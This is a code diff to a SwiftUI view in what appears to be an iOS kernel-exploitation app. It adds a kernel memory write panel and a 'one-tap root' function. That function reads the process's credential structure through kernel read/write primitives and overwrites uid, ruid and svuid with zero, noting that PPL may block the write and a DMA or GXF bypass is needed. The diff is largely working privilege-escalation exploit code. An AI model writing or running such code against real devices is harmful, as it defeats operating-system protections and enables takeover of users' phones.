@@ -17,6 +17,10 @@ struct BleedingEdgeIOSurfaceKRWView: View {
     @State private var dmaReport = ""
     @State private var readAddr = ""
     @State private var readResult = ""
+    @State private var writeAddr = ""
+    @State private var writeVal = ""
+    @State private var writeResult = ""
+    @State private var rootResult = ""
     
     var body: some View {
         List {
@@ -162,6 +166,60 @@ struct BleedingEdgeIOSurfaceKRWView: View {
                 }
             }
             
+            // Write Test
+            Section(header: HeaderLabel(text: "Memory Write", icon: "pencil.line")) {
+                TextField("Write Address (hex)", text: $writeAddr)
+                    .font(.system(.body, design: .monospaced))
+                TextField("Value (hex)", text: $writeVal)
+                    .font(.system(.body, design: .monospaced))
+                
+                Button("Write 8 bytes") {
+                    guard let addr = UInt64(writeAddr.replacingOccurrences(of: "0x", with: ""), radix: 16),
+                          let val = UInt64(writeVal.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
+                    engine.propertyWrite(address: addr, value: val)
+                    // Read back to verify
+                    let readBack = engine.propertyRead(address: addr)
+                    writeResult = String(format: "Wrote 0x%llx → 0x%llx\nRead back: 0x%016llx\n%@",
+                                        val, addr, readBack,
+                                        readBack == val ? "✅ SUCCESS" : "❌ BLOCKED (PPL?)")
+                }
+                .disabled(!mgr.dsready)
+                .foregroundStyle(.red)
+                
+                if !writeResult.isEmpty {
+                    Text(writeResult)
+                        .font(.system(size: 11, design: .monospaced))
+                        .foregroundStyle(writeResult.contains("SUCCESS") ? .green : .red)
+                        .textSelection(.enabled)
+                }
+            }
+            
+            // One-tap Root Attempt
+            Section(header: HeaderLabel(text: "⚡ Root Escalation Test", icon: "bolt.shield.fill")) {
+                Button(action: attemptRoot) {
+                    HStack {
+                        Image(systemName: "person.badge.key.fill")
+                        Text("Attempt uid=0 (Root)")
+                        Spacer()
+                        Image(systemName: "exclamationmark.triangle.fill")
+                            .foregroundStyle(.orange)
+                    }
+                    .foregroundStyle(.red)
+                }
+                .disabled(!mgr.dsready)
+                
+                if !rootResult.isEmpty {
+                    Text(rootResult)
+                        .font(.system(size: 11, design: .monospaced))
+                        .foregroundStyle(rootResult.contains("SUCCESS") ? .green : .orange)
+                        .textSelection(.enabled)
+                }
+                
+                Text("Writes uid=0 to ucred. PPL may block this.")
+                    .font(.caption2)
+                    .foregroundStyle(.secondary)
+            }
+            
             // Research: GXF Entry
             Section(header: HeaderLabel(text: "GXF Entry Research", icon: "shield.lefthalf.filled")) {
                 Button("Generate GXF Report") {
@@ -239,5 +297,52 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         }
         .navigationTitle("IOSurface KRW")
         .premiumStyling()
+    }
+    
+    private func attemptRoot() {
+        guard mgr.dsready else {
+            rootResult = "Kernel not ready"
+            return
+        }
+        
+        let proc = ds_get_our_proc()
+        guard proc != 0 else { rootResult = "proc = 0"; return }
+        
+        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
+        guard procRo != 0 else { rootResult = "proc_ro = 0"; return }
+        
+        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
+        guard ucred != 0 else { rootResult = "ucred = 0"; return }
+        
+        let uidAddr = ucred + 0x18
+        let origUid = ds_kread32(uidAddr)
+        
+        var report = ""
+        report += String(format: "proc:    0x%llx\n", proc)
+        report += String(format: "proc_ro: 0x%llx\n", procRo)
+        report += String(format: "ucred:   0x%llx\n", ucred)
+        report += String(format: "uid addr: 0x%llx\n", uidAddr)
+        report += String(format: "orig uid: %d (0x%x)\n\n", origUid, origUid)
+        
+        // Attempt write uid = 0
+        report += "Writing uid=0...\n"
+        ds_kwrite32(uidAddr, 0)
+        
+        // Read back
+        let newUid = ds_kread32(uidAddr)
+        report += String(format: "Read back uid: %d (0x%x)\n\n", newUid, newUid)
+        
+        if newUid == 0 {
+            report += "✅ SUCCESS — uid=0 achieved! YOU ARE ROOT!"
+            // Also zero ruid and svuid
+            ds_kwrite32(uidAddr + 4, 0)  // cr_ruid
+            ds_kwrite32(uidAddr + 8, 0)  // cr_svuid
+        } else {
+            report += "❌ PPL BLOCKED — uid still \(newUid)\n"
+            report += "Write was silently rejected by PPL.\n"
+            report += "Need IOSurface DMA or GXF bypass for root."
+        }
+        
+        rootResult = report
     }
 }
